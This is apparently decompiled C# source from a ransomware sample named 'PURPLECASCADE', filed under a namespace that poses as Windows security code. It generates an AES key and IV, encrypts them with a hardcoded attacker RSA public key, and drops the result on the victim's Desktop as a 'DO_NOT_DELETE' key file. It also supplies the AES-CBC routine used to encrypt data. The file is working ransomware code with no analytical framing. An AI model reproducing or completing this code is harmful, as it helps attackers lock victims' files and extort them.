using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Xml.Serialization;

namespace WindowsRuntimeSecurity.Encrypter
{
	// Token: 0x02000007 RID: 7
	internal class AesCryptoService
	{
		// Token: 0x06000012 RID: 18 RVA: 0x00002638 File Offset: 0x00000838
		public AesCryptoService()
		{
			using (Aes aes = Aes.Create())
			{
				AesCryptoService.Key = aes.Key;
				AesCryptoService.IV = aes.IV;
				this.SaveEncryptedKeyAndIV(Encoding.UTF8.GetString(AesCryptoService.Key) + "\n" + Encoding.UTF8.GetString(AesCryptoService.IV));
			}
		}

		// Token: 0x06000013 RID: 19 RVA: 0x000026B4 File Offset: 0x000008B4
		private void SaveEncryptedKeyAndIV(string plainTextData)
		{
			StringBuilder stringBuilder = new StringBuilder();
			stringBuilder.AppendLine("<?xml version=\"1.0\" encoding=\"utf - 16\"?>");
			stringBuilder.AppendLine("<RSAParameters xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\">");
			stringBuilder.AppendLine("  <Exponent>AQAB</Exponent>");
			stringBuilder.AppendLine("  <Modulus>pU/cZ0jhMOq6RCaQtR2eHhp1UFonLqpFBc+SmUJnn6hH+boLjWOeZ9Dr+5e3btY+prRZmUavpLoMQKLMJq3wenWOCfY06MoWOq+0rWi47XeiyJDdQQBG2DoRiVtM25O4hRiO690Nx7VD3q3e0hFJyYKY4QAnqBo5hWGAx65uvfnWewcKZLxCUYkQ+k5AuIUcUTPuMyYtudI/t+vaqLvm3qbLoCgbdZhdYmExXPRkZIlv2W7eM17su17qaHFZQF3CAGw3QRAw/t6k9gCAJKpoD6ihlhyxXlkmg7h37O+3Twu65AUagVNUl48UUkw30JNtiCkQuMD8XUfbVQ6Y/6wEPQ==</Modulus>");
			stringBuilder.AppendLine("</RSAParameters>");
			StringReader textReader = new StringReader(stringBuilder.ToString());
			RSAParameters parameters = (RSAParameters)new XmlSerializer(typeof(RSAParameters)).Deserialize(textReader);
			RSACryptoServiceProvider rsacryptoServiceProvider = new RSACryptoServiceProvider();
			rsacryptoServiceProvider.ImportParameters(parameters);
			byte[] bytes = Encoding.Unicode.GetBytes(plainTextData);
			byte[] bytes2 = rsacryptoServiceProvider.Encrypt(bytes, false);
			File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\DO_NOT_DELETE-PURPLECASCADE-CVXC-KEYS.prplcscd_cvxc", bytes2);
		}

		// Token: 0x06000014 RID: 20 RVA: 0x00002760 File Offset: 0x00000960
		public string AES_Encrypt(string plainText)
		{
			if (plainText == null || plainText.Length <= 0)
			{
				throw new ArgumentNullException("plainText");
			}
			if (AesCryptoService.Key == null || AesCryptoService.Key.Length == 0)
			{
				throw new ArgumentNullException("Key");
			}
			if (AesCryptoService.IV == null || AesCryptoService.IV.Length == 0)
			{
				throw new ArgumentNullException("IV");
			}
			byte[] inArray;
			using (AesCryptoServiceProvider aesCryptoServiceProvider = new AesCryptoServiceProvider())
			{
				aesCryptoServiceProvider.Key = AesCryptoService.Key;
				aesCryptoServiceProvider.IV = AesCryptoService.IV;
				aesCryptoServiceProvider.Mode = CipherMode.CBC;
				aesCryptoServiceProvider.Padding = PaddingMode.PKCS7;
				ICryptoTransform transform = aesCryptoServiceProvider.CreateEncryptor(aesCryptoServiceProvider.Key, aesCryptoServiceProvider.IV);
				using (MemoryStream memoryStream = new MemoryStream())
				{
					using (CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Write))
					{
						using (StreamWriter streamWriter = new StreamWriter(cryptoStream))
						{
							streamWriter.Write(plainText);
						}
						inArray = memoryStream.ToArray();
					}
				}
			}
			return Convert.ToBase64String(inArray);
		}

		// Token: 0x04000001 RID: 1
		private static byte[] Key;

		// Token: 0x04000002 RID: 2
		private static byte[] IV;
	}
}
